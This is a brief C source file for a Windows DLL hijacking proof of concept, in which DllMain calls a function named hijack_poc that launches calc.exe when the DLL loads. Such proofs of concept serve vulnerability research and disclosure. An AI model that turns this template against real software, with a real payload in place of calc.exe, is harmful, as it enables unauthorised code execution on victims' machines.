#include <windows.h> 

	int hijack_poc () 
	{ 
	  WinExec ( "calc.exe" , SW_NORMAL );
	  return 0 ; 
	} 
	  
	BOOL WINAPI DllMain 
		 (	HINSTANCE hinstDLL , 
			DWORD dwReason ,
			LPVOID lpvReserved ) 
	{ 
	  hijack_poc () ;
	  return 0 ;
	} 


